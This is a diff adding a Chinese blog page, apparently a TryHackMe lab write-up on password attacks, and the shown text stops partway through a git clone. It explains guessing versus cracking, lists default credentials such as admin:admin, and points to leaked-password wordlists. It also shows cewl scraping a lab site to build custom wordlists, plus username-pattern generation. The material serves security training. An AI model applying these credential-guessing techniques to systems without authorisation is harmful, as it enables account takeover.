@@ -1,0 +1,1282 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>THM-password攻击 - hybcx's blog</title>
+
+  
+    <meta name="description" content="0x01 介绍 这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：  Password profiling Password attacks techniques Online password attacks  什么是密码 密码用作个人访问计算机系统或应用程序的身份验证方法。使用密码可确保帐户的所有者是唯一有权访问的人。但是，如果密码被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-password攻击">
+<meta property="og:url" content="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="0x01 介绍 这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：  Password profiling Password attacks techniques Online password attacks  什么是密码 密码用作个人访问计算机系统或应用程序的身份验证方法。使用密码可确保帐户的所有者是唯一有权访问的人。但是，如果密码被">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217805.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217807.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217808.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217809.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217810.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217812.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217813.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217814.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217815.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217816.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217818.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217819.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217820.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217821.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217822.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217823.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217824.png">
+<meta property="article:published_time" content="2024-07-14T10:10:44.000Z">
+<meta property="article:modified_time" content="2024-07-16T07:18:41.652Z">
+<meta property="article:author" content="hybcx">
+<meta property="article:tag" content="tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217805.png">
+  
+  
+  
+  <meta name="keywords" content="tryhackme">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+    <link rel="shortcut icon" href="/medias/logo.png">
+  
+
+  
+    
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/tryhackme/">tryhackme</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-14T10:10:44.000Z">2024-07-14</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-16T07:18:41.652Z">2024-07-16</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>THM-password攻击</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="0x01-介绍">0x01 介绍</h1>
+<p>这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：</p>
+<ul>
+<li>Password profiling</li>
+<li>Password attacks techniques</li>
+<li>Online password attacks</li>
+</ul>
+<h2 id="什么是密码">什么是密码</h2>
+<p>密码用作个人访问计算机系统或应用程序的身份验证方法。使用密码可确保帐户的所有者是唯一有权访问的人。但是，如果密码被共享或落入坏人之手，则可能会对给定系统进行未经授权的更改。未经授权的访问可能会导致系统整体状态和运行状况发生变化或损坏文件系统。密码通常由字母、数字和符号等字符的组合组成。因此，如何生成密码取决于用户！</p>
+<p>密码的集合通常称为字典或单词列表。在各类公开披露的密码数据泄露事件中，常见的是复杂度低、容易被猜测的密码。例如，易于猜测的密码可以是密码、123456、111111 等等。<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords">以下是最常见和最常见的密码供您参考</a>。因此，攻击者对目标或服务进行密码攻击来猜测密码不会花费很长时间，也很困难。选择强密码是一个很好的做法，这样就很难猜测或破解。强密码不应是常见单词或在字典中找到的密码，并且密码长度至少应为八个字符。它还应包含大写和小写字母、数字和符号字符串（例如：*&amp;^%$#@）。</p>
+<p>有时，公司有自己的密码策略，并强制用户在创建密码时遵循准则。这有助于确保用户不在其组织内使用常见或弱密码，并可以限制暴力破解等攻击媒介。例如，密码长度必须为八个字符或更多，包括字符、一对数字和至少一个符号。然而，如果攻击者弄清楚了密码策略，他就可以生成满足帐户密码策略的密码列表。</p>
+<h2 id="密码的安全性如何">密码的安全性如何</h2>
+<p>密码是访问在线帐户或计算机系统的一种保护方法。密码认证方法用于访问个人和私人系统，其使用密码的主要目的是保证密码安全并且不与他人共享。</p>
+<p>回答这个问题：密码的安全性如何？取决于各种因素。密码通常存储在文件系统或数据库中，保证它们的安全至关重要。我们见过一些公司将密码存储在明文文档中的案例，例如<a target="_blank" rel="noopener" href="https://www.techdirt.com/articles/20141204/12032329332/shocking-sony-learned-no-password-lessons-after-2011-psn-hack.shtml">2014年索尼的数据泄露事件</a>。因此，一旦攻击者访问文件系统，他就可以轻松获取并重复使用这些密码。另一方面，其他人使用散列函数或加密算法等各种技术在系统内存储密码，以使其更加安全。即使攻击者必须访问系统，破解起来也会更加困难。我们将在接下来的任务中介绍破解哈希值。</p>
+<h1 id="0x02-密码攻击技术">0x02 密码攻击技术</h1>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217805.png" alt="image-20240714182139668"></p>
+<p>在这个房间里，我们将讨论可用于执行密码攻击的技术。我们将介绍各种技术，例如字典、暴力破解、规则库和猜测攻击。所有上述技术都被视为主动“在线”攻击，攻击者需要与目标计算机通信以获取密码，以便获得对计算机的未经授权的访问。</p>
+<h2 id="密码破解与密码猜测">密码破解与密码猜测</h2>
+<p>本节从网络安全角度讨论密码破解术语。此外，我们还将讨论密码破解和密码猜测之间的显着差异。最后，我们将演示用于密码破解的各种工具，包括 Hashcat 和 John the Ripper.</p>
+<p>密码破解是一种用于从加密或散列数据到明文数据发现密码的技术。攻击者可能会从受感染的计算机获取加密或散列的密码，或者通过网络传输数据捕获它们。 一旦获得密码，攻击者就可以利用密码攻击技术，使用各种工具破解这些散列密码。</p>
+<p>密码破解被认为是渗透测试的传统技术之一。主要目标是让攻击者升级到更高的权限并访问计算机系统或网络。密码猜测和密码破解是信息安全专业人员经常使用的方法。两者都有不同的含义和含义。密码猜测是一种基于字典猜测在线协议和服务密码的方法。 以下是密码破解和密码猜测之间的主要区别：</p>
+<ul>
+<li>密码猜测是一种用于针对在线协议和服务的技术。因此，它被认为是耗时的，并且提供了为失败的登录尝试生成日志的机会。在基于 Web 的系统上进行的密码猜测攻击通常需要每次尝试都发送一个新的请求，这很容易被检测到。如果系统设计和配置安全，可能会导致帐户被锁定。</li>
+<li>密码破解是一种在本地或由攻击者控制的系统上执行的技术。</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217807.png" alt="image-20240714182607566"></p>
+<h1 id="0x03-密码分析-默认-弱-泄露-组合和用户名单词列表">0x03 密码分析- 默认、弱、泄露、组合和用户名单词列表</h1>
+<p>拥有良好的单词表对于成功进行密码攻击至关重要。了解如何生成用户名列表和密码列表非常重要。在本节中，我们将讨论创建目标用户名和密码列表。我们还将涵盖各种主题，包括默认密码、弱密码、泄露密码以及创建目标单词列表。</p>
+<h2 id="默认密码">默认密码</h2>
+<p>在执行密码攻击之前，值得针对目标服务尝试几个默认密码。制造商为交换机、防火墙、路由器等产品和设备设置默认密码。在某些情况下，客户不更改默认密码，这会使系统容易受到攻击。因此，尝试一下 admin:admin、admin:123456 等是一个很好的做法。如果我们知道目标设备，我们可以查找默认密码并尝试它们。例如，假设目标服务器是 Tomcat，一个轻量级的开源 Java 应用程序服务器。 在这种情况下，我们可以尝试几个可能的默认密码：admin:admin 或 tomcat:admin</p>
+<p>以下是一些提供各种产品默认密码的网站列表。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">https://cirt.net/passwords</a></li>
+<li><a target="_blank" rel="noopener" href="https://default-password.info/">https://default-password.info/</a></li>
+<li><a target="_blank" rel="noopener" href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li>
+</ul>
+<h2 id="弱密码">弱密码</h2>
+<p>随着时间的推移，专业人士会收集并生成弱密码列表，并经常将它们组合成一个大的单词列表。列表是根据他们的经验以及他们在渗透测试中看到的内容生成的。这些列表还可能包含已公开发布的泄露密码。以下是一些常见的弱密码列表：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://wiki.skullsecurity.org/index.php?title=Passwords">https://wiki.skullsecurity.org/index.php?title=Passwords</a> - 这包括最著名的密码集合。</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a> - 各种列表的巨大集合，不仅用于密码破解。</li>
+</ul>
+<h2 id="密码泄露">密码泄露</h2>
+<p>密码或哈希值等敏感数据可能会因违规而被公开披露或出售。这些公共或私人可用的泄漏通常被称为“转储”。根据转储的内容，攻击者可能需要从数据中提取密码。在某些情况下，转储可能只包含密码的哈希值，需要破解才能获得纯文本密码。以下是一些常见的弱密码、泄露密码列表，包括webhost、elitehacker、hak5、Hotmail、PhpBB公司的泄露：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases">SecLists/密码/泄露数据库</a></li>
+</ul>
+<h2 id="组合词表">组合词表</h2>
+<p>假设我们有多个单词表。然后，我们可以将这些单词列表合并成一个大文件。可以使用 cat 按如下方式完成此操作:</p>
+<pre><code class="hljs scss">cat file1<span class="hljs-selector-class">.txt</span> file2<span class="hljs-selector-class">.txt</span> file3<span class="hljs-selector-class">.txt</span> &gt; combined_list<span class="hljs-selector-class">.txt</span></code></pre>
+<p>要清理生成的组合列表以删除重复的单词，我们可以使用 sort 和 uniq，如下所示：</p>
+<pre><code class="hljs scss">sort combined_list<span class="hljs-selector-class">.txt</span> | uniq -u &gt; cleaned_combined_list<span class="hljs-selector-class">.txt</span></code></pre>
+<h2 id="定制词汇表">定制词汇表</h2>
+<p>自定义密码列表是增加找到有效凭据的机会的最佳方法之一。我们可以从目标网站创建自定义密码列表。通常，公司的网站包含有关公司及其员工的宝贵信息，包括电子邮件和员工姓名。此外，该网站可能包含特定于公司所提供产品的关键字，包括产品和服务名称，这些关键字可能会在员工的密码中使用！</p>
+<p>Cewl 等工具可用于有效地抓取网站并提取字符串或关键字。 Cewl 是一个强大的工具，可以生成特定于给定公司或目标的单词列表。请考虑以下示例：</p>
+<pre><code class="hljs scss">cewl -w list<span class="hljs-selector-class">.txt</span> -d <span class="hljs-number">5</span> -m <span class="hljs-number">5</span> http://thm.labs</code></pre>
+<blockquote>
+<p>-w 将把内容写入文件。在本例中为 list.txt。</p>
+<p>-m 5 收集 5 个或更多字符的字符串（单词）</p>
+<p>-d 5 是网络爬行/蜘蛛的深度级别（默认2）</p>
+<p><a target="_blank" rel="noopener" href="http://thm.labs">http://thm.labs</a> 是将要使用的 URL</p>
+</blockquote>
+<p>因此，我们现在应该有一个基于特定企业的相关单词（例如名称、位置和许多商业术语）的适当大小的单词列表。同样，创建的单词列表可用于模糊用户名。</p>
+<p>应用我们讨论的内容，使用 cewl 针对 <a target="_blank" rel="noopener" href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 来解析所有单词并生成最小长度为 8 的单词列表。请注意，我们稍后将在另一个任务中使用此单词列表！</p>
+<h2 id="用户名单词列表">用户名单词列表</h2>
+<p>在点查阶段收集员工姓名至关重要。我们可以从目标网站生成用户名列表。对于下面的示例，我们假设我们有一个 {first name} {last name} （例如：John Smith）和一个生成用户名的方法。</p>
+<ul>
+<li><strong>{first name}:</strong> john</li>
+<li><strong>{last name}:</strong> smith</li>
+<li>{first name}{last name}: johnsmith</li>
+<li>{last name}{first name}: smithjohn</li>
+<li>first letter of the <strong>{first name}{last name}: *<em>jsmith*</em></strong><br>
+{名字}{姓氏}的第一个字母：jsmith</li>
+<li>first letter of the <strong>{last name}{first name}: *<em>sjohn*</em></strong><br>
+{姓氏}{名字}的第一个字母：sjohn</li>
+<li>first letter of the <strong>{first name}.{last name}: *<em>j.smith*</em></strong><br>
+{名字}.{姓氏}的第一个字母：j.smith</li>
+<li>first letter of the <strong>{first name}-{last name}: *<em>j-smith*</em></strong><br>
+{名字}-{姓氏}的第一个字母：j-smith</li>
+<li>and so on</li>
+</ul>
+<p>值得庆幸的是，如果我们有名字和姓氏，有一个工具 username_generator 可以帮助创建包含大多数可能组合的列表。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$ git clone <span class="hljs-attribute">https</span>://github.com/therodri2/username_generator.git
+Cloning into <span class="hljs-string">'username_generator'</span>...
+<span class="hljs-attribute">remote</span>: Enumerating <span class="hljs-attribute">objects</span>: <span class="hljs-number">9</span>, done.
+<span class="hljs-attribute">remote</span>: Counting <span class="hljs-attribute">objects</span>: <span class="hljs-number">100%</span> (<span class="hljs-number">9</span>/<span class="hljs-number">9</span>), done.
